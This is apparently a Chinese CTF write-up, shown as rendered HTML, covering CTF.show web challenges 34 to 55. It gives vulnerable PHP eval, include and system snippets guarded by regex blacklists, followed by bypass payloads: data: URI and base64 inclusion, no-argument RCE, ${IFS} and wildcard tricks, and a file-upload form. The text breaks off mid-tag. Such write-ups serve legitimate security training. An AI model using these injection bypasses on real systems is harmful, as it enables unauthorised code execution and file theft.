<h3 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了一个:好像没什么影响</p>
<p>用上面的payload一样打</p>
<h3 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>又过滤了&lt;还有=</p>
<p>毫无影响</p>
<h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>又过滤了数字那么之前的方法行不通了</p>
<p>可以把数字直接替换成字母，虽然规范要添加引号包含住，但是不写也可以执行</p>
<h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>文件包含漏洞，可以直接文件包含代码执行：<code>data:text/plain,&lt;?php 你想要执行的代码?&gt;</code></p>
<p>最终payload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?c=data:text/plain,&lt;?php echo `cat fla*`?&gt;</span><br></pre></td></tr></table></figure>

<p>flag在源代码里</p>
<h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了php还有file，</p>
<p>上面的payload不能用了，我们可以把后面的内容进行一个base64编码进行执行</p>
<p>payload</p>
<p><code>?c=data:text/plain;base64,PD9waHAgZWNobyBgY2F0IGZsYSpgPz4=</code></p>
<h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这题的意思就是直接在我们的最后添加一个.php</p>
<p>我们可以直接使用上面的代码执行，执行结束之后直接添加.php也不影响执行</p>
<h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>屏蔽了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">数字 ~ @ # \$ % ^ &amp; * ( ) - + = &#123; &#125; [ ] &#x27; &quot; , &lt; . &gt; ? / \</span><br></pre></td></tr></table></figure>

<p>这里的屏蔽的是中文括号，也就是说我们只能用无参RCE</p>
<p>我们想要查看目录可以用print_r(scandir(‘.’))</p>
<p>既然是无参最难的就是构造”.”</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">localeconv()</span><br><span class="line">他是一个数组，第一个就是.我们需要调用数组的第一个又需要介绍一个函数</span><br><span class="line">current（）</span><br><span class="line">他们俩组合current(locakeconv())</span><br><span class="line">就可以调用‘.’拉</span><br><span class="line">可以用print_r(scandir(current(locakeconv())));</span><br><span class="line">查看目录文件</span><br><span class="line">然后用</span><br><span class="line">array_reverse()</span><br><span class="line">next（）</span><br><span class="line">倒置，取下一个，取到我们想要的文件</span><br></pre></td></tr></table></figure>

<p>然后highlight_file就行</p>
<h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>过滤了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0-9 a-z ^ + ~ $ [ ] &#123; &#125; &amp; - </span><br></pre></td></tr></table></figure>









<h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接运行就行，用分号隔断</p>
<p>payload：<code>?c=cat flag.php;</code></p>
<h3 id="web-43"><a href="#web-43" class="headerlink" title="web 43"></a>web 43</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>屏蔽了分号隔断</p>
<p>可以使用||这个符号的作用就是左边执行的话右边不执行</p>
<h3 id="web-44"><a href="#web-44" class="headerlink" title="web 44"></a>web 44</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了flag还有cat</p>
<p>用sort fla*</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">文件读取的方式：</span><br><span class="line">cat--由第一行开始显示内容，并将所有内容输出</span><br><span class="line">tac--从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">more-- 根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head-- 只显示头几行</span><br><span class="line">tail --只显示最后几行</span><br><span class="line">nl --类似于cat -n，显示时输出行号</span><br><span class="line">tailf-- 类似于tail -f</span><br><span class="line">vim --使用vim工具打开文本</span><br><span class="line">vi --使用vi打开文本cat 由第一行开始显示内容，并将所有内容输出</span><br></pre></td></tr></table></figure>





<h3 id="web-45"><a href="#web-45" class="headerlink" title="web 45"></a>web 45</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了空格</p>
<p>空格用%09代替即可绕过</p>
<h3 id="web-46"><a href="#web-46" class="headerlink" title="web 46"></a>web 46</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了$符号以及*还有数字</p>
<p>%09会进行二次编码所以不用担心数字过滤</p>
<p>还有别的绕过方法如${IFS}但是这里过滤了$符号</p>
<p><code>&lt;&gt;,&lt;,$IF$9</code>但在这里好像都不行</p>
<h3 id="web-47"><a href="#web-47" class="headerlink" title="web 47"></a>web 47</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了<code>more less head sort tail</code></p>
<p>可以用tac，具体其他命令44写了</p>
<h3 id="web-48"><a href="#web-48" class="headerlink" title="web 48"></a>web 48</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了<code>sed cut awk strings od curl</code></p>
<p>无影响</p>
<h3 id="web-49"><a href="#web-49" class="headerlink" title="web 49"></a>web 49</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了%用&lt;绕过</p>
<p><code>?c=tac&lt;fla&quot;&quot;g.php||</code></p>
<h3 id="web-50"><a href="#web-50" class="headerlink" title="web 50"></a>web 50</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了tab还有&amp;</p>
<p>一样绕</p>
<h3 id="web-51"><a href="#web-51" class="headerlink" title="web 51"></a>web 51</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>tac也过滤了但是nl没有过滤</p>
<p>替换成nl，vi都行</p>
<h3 id="web-52"><a href="#web-52" class="headerlink" title="web 52"></a>web 52</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在<code>&lt;&gt;</code>也被过滤了但是$符号又放出来了</p>
<p>不过这题的flag在根目录下</p>
<h3 id="web-53"><a href="#web-53" class="headerlink" title="web 53"></a>web 53</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = system(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了wget</p>
<p>直接执行系统命令</p>
<p>payload</p>
<p><code>c=nl$&#123;IFS&#125;fla&quot;&quot;g.php</code></p>
<h3 id="web-54"><a href="#web-54" class="headerlink" title="web 54"></a>web 54</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>;|cat|flag| |[0-9]|\ |more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|nl|scp|rm</code></p>
<p>被过滤的参数</p>
<p>不能出现相连字母，所以flag.php可以用？代替f???????</p>
<p>最后vi输出或者是/bin/后面接过滤参数bin是命令目录</p>
<h3 id="web-55"><a href="#web-55" class="headerlink" title="web 55"></a>web 55</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了所有小写字母</p>
<p>这里需要构造上传，更改一下上传脚本，并且构造poc执行命令</p>
<p><code>?c=.+/???/????????[@-[]</code></p>
<p>[@-[]是linux下面的通配符，匹配的是大写字母</p>
<p>然后在上传文件里面更改添加sh命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">！/bin/sh</span></span><br><span class="line">ls</span><br></pre></td></tr></table></figure>

<p>就可以直接执行命令。</p>
<p>附构造上传脚本：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span 